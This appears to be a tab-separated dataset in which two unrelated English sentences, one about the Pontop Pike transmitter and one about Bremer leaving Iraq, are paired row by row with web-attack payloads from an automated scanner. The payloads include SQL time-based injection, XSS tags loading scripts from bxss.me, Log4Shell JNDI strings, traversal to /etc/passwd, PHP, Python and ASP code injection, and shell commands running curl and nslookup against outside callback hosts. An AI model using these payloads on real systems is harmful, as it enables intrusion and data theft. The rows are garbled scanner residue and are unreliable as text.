It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	xfs.bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	!(()&&!|*|*|
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	^(#$!@#$)(()))******
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	HttP://bxss.me/t/xss.html?%00
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'.gethostbyname(lc('hitsj'.'fibgaohdf95bb.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(114).chr(69).chr(97).chr(69).'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'>"></title></style></textarea></noscript></template></script><script/src="//bxss.me/bsp?u=009365&r=354-1603&h=354-a4363-2&"></script>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	".gethostbyname(lc("hitgv"."fbfbgkjned650.bxss.me."))."A".chr(67).chr(hex("58")).chr(103).chr(81).chr(102).chr(82)."
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	bxss.me/t/xss.html?%00
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'"()
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${j${::-n}di:dns${::-:}${::-/}${::-/}hitzsngwlbgwc1cfba${::-.}bxss.me}zzzz${url:UTF-8:http://hitgflwaninxe.bxss.me/}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	../../../../../../../../../../../../../../etc/passwd
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'&&sleep(27*1000)*cbpdri&&'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	../../../../../../../../../../../../../../windows/win.ini
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'"()&%<zzz><ScRiPt >ntj6(9332)</ScRiPt>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'"()&%<zzz><ScRiPt >ntj6(9355)</ScRiPt>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language"&&sleep(27*1000)*qwcnzz&&"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	file:///etc/passwd
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language9938325
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'||sleep(27*1000)*hybecv||'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language"||sleep(27*1000)*esbbra||"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	../offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}${::-/}dns.log4j.009365.354-1605.354.a4363${::-.}1${::-.}bxss.me}}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%00.jpg
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	Http://bxss.me/t/fit.txt
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitgpedflhkee8bfd2.'+'bxss.me')
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	http://bxss.me/t/fit.txt%3F.jpg
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitgpedflhkee8bfd2."+"bxss.me")+'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	response.write(9570612*9943450)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'+response.write(9570612*9943450)+'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitgpedflhkee8bfd2.'+'bxss.me')+"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	';print(md5(31337));$a='
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	http://hitkefrcqunsr.bxss.me/
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	/etc/shells
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	";print(md5(31337));$a="
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	<!--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	"+response.write(9570612*9943450)+"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	c:/windows/win.ini
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${@print(md5(31337))}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	hitkefrcqunsr.bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${@print(md5(31337))}\
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'.print(md5(31337)).'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	echo sbcfra$()\ cyutjv\nz^xyu||a #' &echo sbcfra$()\ cyutjv\nz^xyu||a #|" &echo sbcfra$()\ cyutjv\nz^xyu||a #
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	&echo djmruo$()\ rsnvrh\nz^xyu||a #' &echo djmruo$()\ rsnvrh\nz^xyu||a #|" &echo djmruo$()\ rsnvrh\nz^xyu||a #
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	|echo ftjeuf$()\ hwxgpf\nz^xyu||a #' |echo ftjeuf$()\ hwxgpf\nz^xyu||a #|" |echo ftjeuf$()\ hwxgpf\nz^xyu||a #
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	(nslookup -q=cname hitdwqztwtzsd9a243.bxss.me||curl hitdwqztwtzsd9a243.bxss.me))
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	$(nslookup -q=cname hitvsqtapmwrl828cb.bxss.me||curl hitvsqtapmwrl828cb.bxss.me)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	&nslookup -q=cname hitccndqorgjdb2c26.bxss.me&'\"`0&nslookup -q=cname hitccndqorgjdb2c26.bxss.me&`'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	&(nslookup -q=cname hitjraghxodqn73939.bxss.me||curl hitjraghxodqn73939.bxss.me)&'\"`0&(nslookup -q=cname hitjraghxodqn73939.bxss.me||curl hitjraghxodqn73939.bxss.me)&`'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	|(nslookup -q=cname hitptirwesoomddde5.bxss.me||curl hitptirwesoomddde5.bxss.me)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	`(nslookup -q=cname hitkfgsyfkpdk1d009.bxss.me||curl hitkfgsyfkpdk1d009.bxss.me)`
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	;(nslookup -q=cname hitjgcosrxqio04073.bxss.me||curl hitjgcosrxqio04073.bxss.me)|(nslookup -q=cname hitjgcosrxqio04073.bxss.me||curl hitjgcosrxqio04073.bxss.me)&(nslookup -q=cname hitjgcosrxqio04073.bxss.me||curl hitjgcosrxqio04073.bxss.me)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	PcMQlLc5
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1 OR 2+611-611-1=0+0+0+1 -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1 OR 2+493-493-1=0+0+0+1
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1' OR 2+557-557-1=0+0+0+1 -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1' OR 2+644-644-1=0+0+0+1 or 'ZOXcBw27'='
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1" OR 2+811-811-1=0+0+0+1 -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	if(now()=sysdate(),sleep(15),0)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1 waitfor delay '0:0:15' -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	OqSZ3PfX'; waitfor delay '0:0:15' -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	0tvy7pgO' OR 25=(SELECT 25 FROM PG_SLEEP(15))--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	ULmCkOdA') OR 696=(SELECT 696 FROM PG_SLEEP(15))--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	wh2zBidW')) OR 292=(SELECT 292 FROM PG_SLEEP(15))--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1'"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	@@RICpB
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	XsbjDflz
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'>"></title></style></textarea></noscript></template></script><script/src="//bxss.me/bsp?u=009365&r=354-2361&h=354-a4363-2&"></script>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language&n934039=v968104
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language%0abcc:009365.354-2364.354.a4363.19651.2@bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${9999446+9999859}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language%00
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	to@example.com>%0d%0abcc:009365.354-2365.354.a4363.19651.2@bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	response.write(9619139*9543313)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language<esi:include src="http://bxss.me/rpb.png"/>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'+response.write(9619139*9543313)+'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	"+response.write(9619139*9543313)+"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	xfs.bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	HttP://bxss.me/t/xss.html?%00
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitfvnbjpgazn13d91.'+'bxss.me')
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	!(()&&!|*|*|
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'.gethostbyname(lc('hitjb'.'zbgsxduh04b3d.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(119).chr(75).chr(98).chr(80).'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	bxss.me/t/xss.html?%00
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitfvnbjpgazn13d91."+"bxss.me")+'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	^(#$!@#$)(()))******
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	http://hitrjzywprniw.bxss.me/
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	".gethostbyname(lc("hitxv"."xqzbqmnr2a28b.bxss.me."))."A".chr(67).chr(hex("58")).chr(122).chr(70).chr(107).chr(71)."
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitfvnbjpgazn13d91.'+'bxss.me')+"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	hitrjzywprniw.bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	../../../../../../../../../../../../../../etc/passwd
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	<!--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${j${::-n}di:dns${::-:}${::-/}${::-/}hitbofdiudxsk852db${::-.}bxss.me}zzzz${url:UTF-8:http://hitnhusowpqvu.bxss.me/}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	../../../../../../../../../../../../../../windows/win.ini
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'"()
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'&&sleep(27*1000)*wsdbgp&&'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	file:///etc/passwd
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language"&&sleep(27*1000)*cvcnzp&&"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'||sleep(27*1000)*kbhopv||'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	';print(md5(31337));$a='
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	../offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	";print(md5(31337));$a="
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language"||sleep(27*1000)*fcoxlo||"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${@print(md5(31337))}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${@print(md5(31337))}\
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}${::-/}dns.log4j.009365.354-2377.354.a4363${::-.}1${::-.}bxss.me}}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'.print(md5(31337)).'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'"()&%<zzz><ScRiPt >AQAS(9371)</ScRiPt>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'"()&%<zzz><ScRiPt >AQAS(9173)</ScRiPt>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language9526300
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%00.jpg
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	Http://bxss.me/t/fit.txt
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	http://bxss.me/t/fit.txt%3F.jpg
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	/etc/shells
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	c:/windows/win.ini
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	echo ndsxfn$()\ zdxvmc\nz^xyu||a #' &echo ndsxfn$()\ zdxvmc\nz^xyu||a #|" &echo ndsxfn$()\ zdxvmc\nz^xyu||a #
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	&echo pttrcu$()\ vkmtad\nz^xyu||a #' &echo pttrcu$()\ vkmtad\nz^xyu||a #|" &echo pttrcu$()\ vkmtad\nz^xyu||a #
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	|echo udfejb$()\ dgcdij\nz^xyu||a #' |echo udfejb$()\ dgcdij\nz^xyu||a #|" |echo udfejb$()\ dgcdij\nz^xyu||a #
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	(nslookup -q=cname hittqwhldamqpa12ea.bxss.me||curl hittqwhldamqpa12ea.bxss.me))
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	$(nslookup -q=cname hitlytujeqeghc0efd.bxss.me||curl hitlytujeqeghc0efd.bxss.me)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	&nslookup -q=cname hitlerictennl1621f.bxss.me&'\"`0&nslookup -q=cname hitlerictennl1621f.bxss.me&`'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	&(nslookup -q=cname hitdxpktuczpgc6f73.bxss.me||curl hitdxpktuczpgc6f73.bxss.me)&'\"`0&(nslookup -q=cname hitdxpktuczpgc6f73.bxss.me||curl hitdxpktuczpgc6f73.bxss.me)&`'
